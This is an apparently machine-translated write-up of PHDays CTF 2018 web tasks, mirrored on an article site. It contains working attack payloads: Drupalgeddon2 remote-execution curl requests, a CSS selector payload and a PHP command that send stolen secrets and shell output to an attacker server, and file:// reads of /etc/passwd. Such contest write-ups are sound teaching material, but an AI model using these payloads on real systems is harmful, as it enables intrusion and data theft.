<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>PHDays CTF 2018. Writeup maker-up</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Hi, Habr. Being a layout designer, this year decided to participate in the CTF from PHDays. 
 After reviewing the list of tasks, I decided to try my l...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>PHDays CTF 2018. Writeup maker-up</h1><div class="post__text post__text-html js-mediator-article">  Hi, Habr.  Being a layout designer, this year decided to participate in the CTF from PHDays. <br>  After reviewing the list of tasks, I decided to try my luck with the Engeeks car.  Looking ahead, I will say that I never got the flag in this task.  But others decided.  Therefore, sign for what I could get to the bottom.  Do not disappear the same finds. <a name="habracut"></a><br><br><h2>  Engeeks </h2><br>  <a href="http://172.104.246.110/">172.104.246.110</a> <br><br>  The name clearly hinted at the nginx web server.  After inspecting the main (and only) page of the site found that the feedback form does not work.  The specified url for processing sent messages responds with status 404. 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
    <img src="https://habrastorage.org/webt/dg/mt/oq/dgmtoqd_oopz1lzdgtcqdasm8tc.png"><br><br>  After reviewing the source of the send script, we see another commented url `/ admino4ka / contact_dev.php`.  Now this page is given a page with status 404, without disclosing information.  But a few days after the start of the contest, the transition to this link revealed the real ip address and port of the server backend in the signature.  An example took a picture from the Internet. <br><br><img src="https://habrastorage.org/webt/ef/o6/wm/efo6wm7vznuwk67fdohcr7tpkjo.png"><br>  <i>In the original ip address was 139.162.190.95 and port 63425.</i> <br><br>  Page <a href="http://139.162.190.95/">139.162.190.95</a> : 63425 looks identical to <a href="http://172.104.246.110/admino4ka/">172.104.246.110/admino4ka</a> , which confirms the disclosure of the real ip backend server.  After reviewing the content, we see links to 3 domains in the .local zone. <br><br><img src="https://habrastorage.org/webt/b5/yq/zw/b5yqzwv-8kfzq0qgtubx5qepd6q.png"><br><br>  We try to contact one of them by replacing the Host header.  And nothing. <br><br><img src="https://habrastorage.org/webt/jb/0q/lz/jb0qlz3mbl-jmdphujcc3_ctdmi.png"><br>  <i>The page responds with 403 status.</i> <br><br>  The very first thought that there is a check for access from the local ip address.  Add the X-Forwarded-For header with the value 127.0.0.1.  Bingo!  We see the blog page on the drupal. <br><br><img src="https://habrastorage.org/webt/oq/jm/rh/oqjmrhuuiplqmqvc8rsyxyloau0.png"><br><br>  To access the blog on Jumla script is identical.  But the WordPress site, when trying to open redirects on himself (http: //wp.local: 63425).  After several experiments, it turned out that changing the request method from GET to POST helped to overcome this barrier. <br><br>  For convenience, I wrapped the addresses <a href="http://wp.local/">wp.local</a> , <a href="http://drupal.local/">drupal.local</a> and <a href="http://joomla.local/">joomla.local</a> on 127.0.0.1 and started the local nginx server with the following config. <br><br><pre><code class="hljs nginx"><span class="hljs-section"><span class="hljs-section">events</span></span> { } <span class="hljs-section"><span class="hljs-section">http</span></span> { <span class="hljs-section"><span class="hljs-section">server</span></span> { <span class="hljs-attribute"><span class="hljs-attribute">server_name</span></span> wp.local; <span class="hljs-attribute"><span class="hljs-attribute">location</span></span> / { <span class="hljs-attribute"><span class="hljs-attribute">proxy_method</span></span> POST; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> Host wp.local; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> X-Forwarded-For <span class="hljs-number"><span class="hljs-number">127.0.0.1</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_pass</span></span> http://139.162.190.95:63425; } } <span class="hljs-section"><span class="hljs-section">server</span></span> { <span class="hljs-attribute"><span class="hljs-attribute">server_name</span></span> drupal.local; <span class="hljs-attribute"><span class="hljs-attribute">location</span></span> / { <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> Host drupal.local; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> X-Forwarded-For <span class="hljs-number"><span class="hljs-number">127.0.0.1</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_pass</span></span> http://139.162.190.95:63425; } } <span class="hljs-section"><span class="hljs-section">server</span></span> { <span class="hljs-attribute"><span class="hljs-attribute">server_name</span></span> joomla.local; <span class="hljs-attribute"><span class="hljs-attribute">location</span></span> / { <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> Host joomla.local; <span class="hljs-attribute"><span class="hljs-attribute">proxy_set_header</span></span> X-Forwarded-For <span class="hljs-number"><span class="hljs-number">127.0.0.1</span></span>; <span class="hljs-attribute"><span class="hljs-attribute">proxy_pass</span></span> http://139.162.190.95:63425; } } }</code> </pre> <br>  What allowed to quietly study the contents of these sites, clicking on direct links.  Only to access the rest api WordPress had to change <code>proxy_method POST;</code>  on <code>proxy_method GET;</code> <br><br>  Study sites unfortunately did not lead to anything.  CMS versions were pretty fresh.  Even in despair, he tried unsuccessfully to get passwords to the CMS admins.  The drupalgedon2 exploit2 also did not work on the drupal site. <br><br><pre> <code class="bash hljs">curl -s -X <span class="hljs-string"><span class="hljs-string">'POST'</span></span> --data <span class="hljs-string"><span class="hljs-string">'mail[%23post_render][]=exec&amp;mail[%23children]=uname -a&amp;form_id=user_register_form'</span></span> -H <span class="hljs-string"><span class="hljs-string">'Host: drupal.local'</span></span> -H <span class="hljs-string"><span class="hljs-string">'X-Forwarded-For: 127.0.0.1'</span></span> <span class="hljs-string"><span class="hljs-string">'http://139.162.190.95:63425/user/register?element_parents=account/mail/%23value&amp;ajax_form=1'</span></span></code> </pre> <br>  When it seemed that everything was unsuccessful, a hint appeared in the telegrams of the channel: ‚ÄúHint for eNgeeks: Drupalgeddon2 is still alive‚Äù.  Which again gave impetus, dig in the direction of Drupalgeddon2.  And for good reason. <br><br><pre> <code class="bash hljs"> curl -k <span class="hljs-string"><span class="hljs-string">'http://139.162.190.95:63425/user/register?element_parents=timezone/timezone/%23value&amp;ajax_form=1&amp;_wrapper_format=drupal_ajax'</span></span> \ -H <span class="hljs-string"><span class="hljs-string">'Host: drupal.local'</span></span> \ -H <span class="hljs-string"><span class="hljs-string">'X-Forwarded-For: 127.0.0.1'</span></span> \ --data <span class="hljs-string"><span class="hljs-string">"form_id=user_register_form&amp;_drupal_ajax=1&amp;timezone[a][#lazy_builder][]=exec&amp;timezone[a][#lazy_builder][][]=sleep+5"</span></span></code> </pre> <br>  Execution of this command showed that there are blind RCE.  Team sleep worked on the server.  But the joy was short-lived, attempts to construct more significant commands provoked WAF on the server, canceling the possibility of execution.  Having tormented for a long time, I left this task without receiving a flag. <br><br>  <b>UPDATE:</b> The law of meanness.  Working RCE turned out to unleash until the end immediately after writing this article. <br><br><h2>  Board </h2><br>  <a href="http://172.104.246.110/">172.104.246.110</a> : 9091 <br><br>  Looking into the source code of the site, I was very happy.  Here he is!  Here it is the same task for the coder!  The source said that before me is a SPA application.  In addition, at that moment when I began to decide, there was already a hint in the telegram channel for this task. <br><br><blockquote>  Hint2 for board: OK guys ... you need to get api sources.  Aaand nothing of your hacky things works?  Maybe there is an exception that returns you full file path?  Did you notice punycode dependency? </blockquote><br>  Well, punycode dependency?  Really.  In the source code of the bundle, we see that package.json is also in the build.  And you can see the dependence on the module punycode version 2.1.0 (Last at the moment). <br><br><img src="https://habrastorage.org/webt/5c/pc/zq/5cpczqzxextoxjerlcdihqlo-ny.png"><br><br>  Having found this module on the githaba, I notice a fresh open Issue: <br><br><img src="https://habrastorage.org/webt/9n/6u/wf/9n6uwfu1f0qoedogyij6cbydnz8.png"><br><br>  Then I look for which of the values ‚Äã‚Äãtransmitted to the server is sensitive to punycode.  It is not so difficult to find him.  This is the Title field on the chat screen. <br><br><img src="https://habrastorage.org/webt/fc/ac/hy/fcachybpdkc2kzoepirksxj8_r4.png"><br><br>  Server error, gives us the path disclosure.  And going to <a href="http://172.104.246.110/">172.104.246.110</a> : 9091 / 05da126b0edfb13d3b9377797b5f25d6 / methods.js you can see the source code of the methods module.  It is logical to assume that <a href="http://172.104.246.110/">172.104.246.110</a> : 9091 / 05da126b0edfb13d3b9377797b5f25d6 / index.js shows the source API server. <br><br>  Here you can find a lot of interesting things.  For example, the fact that the flag is written in the secret field of the admin. <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">async</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">createUser</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">{ id, style } = {}</span></span></span><span class="hljs-function">) </span></span>{ id = (<span class="hljs-number"><span class="hljs-number">0</span></span>, _utils.sanitizeId)(id) || (<span class="hljs-number"><span class="hljs-number">0</span></span>, _v.default)(); <span class="hljs-keyword"><span class="hljs-keyword">let</span></span> created = <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>().getTime(), session = (<span class="hljs-number"><span class="hljs-number">0</span></span>, _md.default)(<span class="hljs-string"><span class="hljs-string">`</span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">${id}</span></span></span><span class="hljs-string">|</span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">${created}</span></span></span><span class="hljs-string">|</span><span class="hljs-subst"><span class="hljs-string"><span class="hljs-subst">${(</span></span><span class="hljs-number"><span class="hljs-string"><span class="hljs-subst"><span class="hljs-number">0</span></span></span></span><span class="hljs-string"><span class="hljs-subst">, _v.</span></span><span class="hljs-keyword"><span class="hljs-string"><span class="hljs-subst"><span class="hljs-keyword">default</span></span></span></span><span class="hljs-string"><span class="hljs-subst">)()}</span></span></span><span class="hljs-string">`</span></span>), user = { id, created, session, <span class="hljs-attr"><span class="hljs-attr">secret</span></span>: id === _bot.adminId ? process.env.FLAG : <span class="hljs-string"><span class="hljs-string">'nah... you don\'t need a secret...'</span></span>, <span class="hljs-attr"><span class="hljs-attr">style</span></span>: (<span class="hljs-number"><span class="hljs-number">0</span></span>, _utils.sanitize)(style) }; <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> _utils.db.Users.insertOne(user); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> user; }</code> </pre> <br>  Or the fact that specifying <code>__NEW_FEATURE__ = true</code> and passing css in the style field, we can make ourselves the same beautiful background of the board as the admin. <br><br><pre> <code class="javascript hljs"> app.post(<span class="hljs-string"><span class="hljs-string">'/api/id'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">async</span></span> (req, res) =&gt; { <span class="hljs-keyword"><span class="hljs-keyword">let</span></span> _ref2 = <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> (<span class="hljs-number"><span class="hljs-number">0</span></span>, _methods.createUser)({ <span class="hljs-attr"><span class="hljs-attr">style</span></span>: req.body.__NEW_FEATURE__ &amp;&amp; req.body.style }), id = _ref2.id, session = _ref2.session, secret = _ref2.secret; <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!id) <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> res.status(<span class="hljs-number"><span class="hljs-number">400</span></span>).end(); res.cookie(<span class="hljs-string"><span class="hljs-string">'session'</span></span>, session, { <span class="hljs-attr"><span class="hljs-attr">maxAge</span></span>: <span class="hljs-number"><span class="hljs-number">3600000</span></span>, <span class="hljs-attr"><span class="hljs-attr">httpOnly</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span> }); res.status(<span class="hljs-number"><span class="hljs-number">200</span></span>).json({ id, secret }); });</code> </pre> <br>  And also, we confirm our guesses about XSS in this task. <br><br><pre> <code class="javascript hljs"><span class="hljs-keyword"><span class="hljs-keyword">async</span></span> <span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">visitPage</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">url</span></span></span><span class="hljs-function">) </span></span>{ <span class="hljs-keyword"><span class="hljs-keyword">let</span></span> browser = <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> _puppeteer.default.launch(chromeSettings), page = <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> browser.newPage(); <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> page.setCookie({ <span class="hljs-attr"><span class="hljs-attr">name</span></span>: <span class="hljs-string"><span class="hljs-string">'session'</span></span>, <span class="hljs-attr"><span class="hljs-attr">value</span></span>: adminSession, url, <span class="hljs-attr"><span class="hljs-attr">path</span></span>: <span class="hljs-string"><span class="hljs-string">'/'</span></span>, <span class="hljs-attr"><span class="hljs-attr">expires</span></span>: <span class="hljs-built_in"><span class="hljs-built_in">Math</span></span>.floor(<span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Date</span></span>().getTime() / <span class="hljs-number"><span class="hljs-number">1000</span></span>) + <span class="hljs-number"><span class="hljs-number">5</span></span>, <span class="hljs-attr"><span class="hljs-attr">httpOnly</span></span>: <span class="hljs-literal"><span class="hljs-literal">true</span></span> }); <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> page.goto(url, { <span class="hljs-string"><span class="hljs-string">'waitUntil'</span></span>: <span class="hljs-string"><span class="hljs-string">'domcontentloaded'</span></span> }); <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> <span class="hljs-keyword"><span class="hljs-keyword">new</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Promise</span></span>(<span class="hljs-function"><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">r</span></span></span><span class="hljs-function"> =&gt;</span></span> setTimeout(r, visitingTimeout)); <span class="hljs-keyword"><span class="hljs-keyword">await</span></span> browser.close(); }</code> </pre> <br>  It remains only to stuff the payload in style, write a message on the admin board, and pulling off his session to peek at the secret value.  But not everything is so simple.  As you can see, the style is processed before being saved.  That excludes the possibility to go beyond the style tag and execute the script. <br><br><pre> <code class="javascript hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-function"> </span><span class="hljs-title"><span class="hljs-function"><span class="hljs-title">sanitize</span></span></span><span class="hljs-function">(</span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">str</span></span></span><span class="hljs-function">) </span></span>{ str = (str || <span class="hljs-string"><span class="hljs-string">''</span></span>).replace(<span class="hljs-regexp"><span class="hljs-regexp">/[&lt;&gt;'\\*\n\s]/g</span></span>, <span class="hljs-string"><span class="hljs-string">''</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">return</span></span> forbiddenWordsRE.test(str) ? <span class="hljs-literal"><span class="hljs-literal">null</span></span> : str; }</code> </pre> <br>  If you examine the generated DOM of the board page, you can see that the secret is for some reason added to the content attribute of the element with the id secret. <br><br><img src="https://habrastorage.org/webt/n-/s-/2t/n-s-2tzoibdff3jjovxja_jlfb8.png"><br><br>  After finding this moment, all the pieces of the puzzle fell into place.  The script is not needed, get the flag through CSS. <br><br><pre> <code class="css hljs"><span class="hljs-selector-id"><span class="hljs-selector-id">#secret</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[content^=A]</span></span>{<span class="hljs-attribute"><span class="hljs-attribute">background-image</span></span>:<span class="hljs-built_in"><span class="hljs-built_in">url</span></span>(http://MY_SERVER/url/A)} <span class="hljs-selector-id"><span class="hljs-selector-id">#secret</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[content^=a]</span></span>{<span class="hljs-attribute"><span class="hljs-attribute">background-image</span></span>:<span class="hljs-built_in"><span class="hljs-built_in">url</span></span>(http://MY_SERVER/url/a)} <span class="hljs-selector-id"><span class="hljs-selector-id">#secret</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[content^=B]</span></span>{<span class="hljs-attribute"><span class="hljs-attribute">background-image</span></span>:<span class="hljs-built_in"><span class="hljs-built_in">url</span></span>(http://MY_SERVER/url/B)} <span class="hljs-selector-id"><span class="hljs-selector-id">#secret</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[content^=b]</span></span>{<span class="hljs-attribute"><span class="hljs-attribute">background-image</span></span>:<span class="hljs-built_in"><span class="hljs-built_in">url</span></span>(http://MY_SERVER/url/b)} <span class="hljs-selector-id"><span class="hljs-selector-id">#secret</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[content^=C]</span></span>{<span class="hljs-attribute"><span class="hljs-attribute">background-image</span></span>:<span class="hljs-built_in"><span class="hljs-built_in">url</span></span>(http://MY_SERVER/url/C)} <span class="hljs-selector-id"><span class="hljs-selector-id">#secret</span></span><span class="hljs-selector-attr"><span class="hljs-selector-attr">[content^=c]</span></span>{<span class="hljs-attribute"><span class="hljs-attribute">background-image</span></span>:<span class="hljs-built_in"><span class="hljs-built_in">url</span></span>(http://MY_SERVER/url/c)} ...</code> </pre> <br>  Having made similar payloads for receiving each secret symbol and forcing the administrator to go to your board, you can see the appeal to the paths corresponding to the symbol in the logs of your web server.  And so symbol-by-character pull out the value of the flag. <br><br>  I used the <a href="http://webhook.site/">webhook.site</a> service instead of the server, because I decided to drag the objects with improvised means. <br><br><h2>  mnogorock </h2><br>  <a href="http://172.104.137.194/">172.104.137.194</a> <br><br>  This task was decided surprisingly very quickly.  Having opened the link, at once we see the hint in the source code of the page. <br><br><img src="https://habrastorage.org/webt/hw/wy/iz/hwwyizey_nihahhgcoukmcb_0xq.png"><br><br>  We are hinted to send a POST request with a <code>comand</code> field equal to <code>inform()</code> .  I send, and in the answer comes the line "du u now de wei?" <br><br>  I try to send something else as a command.  Let's say test.  The service responds with an error and a cool clip about the red cap. <br><br><img src="https://habrastorage.org/webt/oh/kl/rd/ohklrdum2givplvf05zukrdcmr8.png"><br><br>  From here we understand that we have a black box written in PHP. <br><br>  Experimentally we find that constructions of the form <code>[inform(), inform()]</code> , <code>inform(inform())</code> and <code>'inform'()</code> work by executing the function <code>inform</code> on the server.  I try to execute php function by wrapping it in quotes. <br><br><pre> <code class="php hljs"><span class="hljs-string"><span class="hljs-string">'sleep'</span></span>(<span class="hljs-number"><span class="hljs-number">5</span></span>)</code> </pre> <br>  By the response time, you can see that the function has completed.  And then I made a mistake.  Instead of executing commands through the <code>system</code> , which would immediately give the output of the command to the source code, I tried to call functions via <code>shell_exec</code> .  And this gave only blind RCE.  Neither curl, nor wget on the server worked to transmit the results of the command.  Saved php function <code>file_get_contents</code> . <br><br>  The final exploit looked like this: <br><br><pre> <code class="php hljs"><span class="hljs-string"><span class="hljs-string">'file_get_contents'</span></span>(<span class="hljs-string"><span class="hljs-string">'http://MY_SERVER/url/'</span></span>.<span class="hljs-string"><span class="hljs-string">'base64_encode'</span></span>(<span class="hljs-string"><span class="hljs-string">'shell_exec'</span></span>(<span class="hljs-string"><span class="hljs-string">'cat index.php'</span></span>)))</code> </pre> <br>  As a third-party server, <a href="http://webhook.site/">webhook.site</a> again performed.  Having received the source code of the script was a little confused, not finding the flag inside.  But after walking a little bit in folders, the flag was quickly found in one of the files at the root. <br><br><h2>  CryptoApocalypse </h2><br>  <a href="http://92.53.66.223/">92.53.66.223</a> <br><br>  Probably the most trolling among all.  The authors placed many honipots.  By inserting different addresses in the field, I became convinced that this is a service anonymizer.  Having checked the processing of quotes, the address http: // 'we see one of the developers' jokes: <br><br><pre> <code class="hljs sql">You have an error in your SQL syntax; <span class="hljs-keyword"><span class="hljs-keyword">check</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">manual</span></span> that corresponds <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> your MySQL <span class="hljs-keyword"><span class="hljs-keyword">server</span></span> <span class="hljs-keyword"><span class="hljs-keyword">version</span></span> <span class="hljs-keyword"><span class="hljs-keyword">for</span></span> the <span class="hljs-keyword"><span class="hljs-keyword">right</span></span> syntax <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">use</span></span> near <span class="hljs-string"><span class="hljs-string">'AND sign=true AND url '</span></span><span class="hljs-keyword"><span class="hljs-keyword">http</span></span>://<span class="hljs-string"><span class="hljs-string">''</span></span> <span class="hljs-keyword"><span class="hljs-keyword">at</span></span> line <span class="hljs-number"><span class="hljs-number">1</span></span></code> </pre> <br>  It looks almost very convincing.  If it were not for the space after the word url, I don‚Äôt know how much time I would have spent searching for a nonexistent SQL injection. <br><br>  Having tried to connect to the mysql service on port 3306, we see the message: <br><br><pre> <code class="hljs pgsql">Host MY_IP <span class="hljs-keyword"><span class="hljs-keyword">is</span></span> <span class="hljs-keyword"><span class="hljs-keyword">not</span></span> allowed <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> <span class="hljs-keyword"><span class="hljs-keyword">connect</span></span> <span class="hljs-keyword"><span class="hljs-keyword">to</span></span> this MySQL <span class="hljs-keyword"><span class="hljs-keyword">server</span></span></code> </pre> <br>  Substituting the address <a href="http://127.0.0.1/">127.0.0.1</a> made sure that the service can open local addresses.  But when contacting <a href="http://127.0.0.1/">127.0.0.1</a> : 3306 via an anonymizer, we see that at least access has been received, but <code>Got packets out of order</code> .  Which means that the mysql server was trying to process the fields from the request. <br><br>  Look like that's it.  Dead end.  We go to the telegram channel for a hint and see: <br><br><blockquote>  Hint for CryptoApocalypse: check dump.tar.gz </blockquote><br>  <a href="">92.53.66.223/dump.tar.gz</a> .  Very funny.  What else? <br><br><blockquote>  Hint for CryptoApocalypse: No need for ssrf, read the source file! </blockquote><br><blockquote>  Hint for CryptoApocalypse: Ok, ok!  You should get the source code using ‚Äúfile‚Äù via curl! </blockquote>  So, this is already useful.  But the attempt to open the file: /// etc / passwd link opens another trolling of the task creators.  Only a few hours left before the end of the CTF.  Panic already trying different options for writing references.  Suddenly!  file: '/// etc / passwd <br><br><img src="https://habrastorage.org/webt/o2/jo/e0/o2joe0muhwhiqqrjvcc0922kaxg.png"><br><br>  I am a little surprised if this is just another trolling from the authors.  But no.  The file: '/// etc / hosts link also works.  Good.  It remains to find the flag.  Immediately checked the file /var/www/html/index.php and was not mistaken.  The flag was inside. <br><br>  PS: As I found out later, instead of quotes in <code>file:'///var/www/html/index.php</code> you could put any character. </div><p>Source: <a href="https://habr.com/ru/post/354838/">https://habr.com/ru/post/354838/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../354828/index.html">The science of emotion: how smart technologies learn to understand people</a></li>
<li><a href="../354830/index.html">How to detect FinFisher. ESET Manual</a></li>
<li><a href="../354832/index.html">Biomechanics. Start</a></li>
<li><a href="../354834/index.html">DevConf: a little about blockchain</a></li>
<li><a href="../354836/index.html">Secure Development Section on the PHDays 8 Forum</a></li>
<li><a href="../354840/index.html">Why employees no longer criticize the sysadmin: managing feedback using chatbot</a></li>
<li><a href="../354842/index.html">Security Week 15: Spy Speakers and Hacking Hotel Keys</a></li>
<li><a href="../354844/index.html">Check Point API + Splunk. Automation of protection against network attacks</a></li>
<li><a href="../354846/index.html">How to put one CDN into another?</a></li>
<li><a href="../354848/index.html">Inventory it, inventory it: SAM</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>